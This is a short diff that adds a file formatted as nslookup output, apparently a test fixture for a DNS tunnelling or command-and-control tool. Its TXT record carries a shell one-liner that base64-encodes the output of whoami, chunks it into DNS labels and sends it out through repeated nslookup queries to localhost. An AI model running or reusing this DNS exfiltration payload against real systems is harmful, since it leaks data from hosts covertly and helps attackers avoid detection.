@@ -1,0 +1,8 @@
+Server:		localhost
+Address:	127.0.0.1#53
+
+Non-authoritative answer:
+x1	text = "(whoami|base64|while read r\;do i=0\;k=0\;while [ $i -lt ${#r} ]\;do j=0\;p=\"x1$k.\"\;k=$[k+1]\;while [ $i -lt ${#r} ] && [ $j -lt 3 ]\;do p=\"$p${r:$i:61}.\"\;i=$[i+61]\;j=$[j+1]\;done\;`nslookup ${p} localhost`\;done\;done\;)"
+
+Authoritative answers can be found from:
+
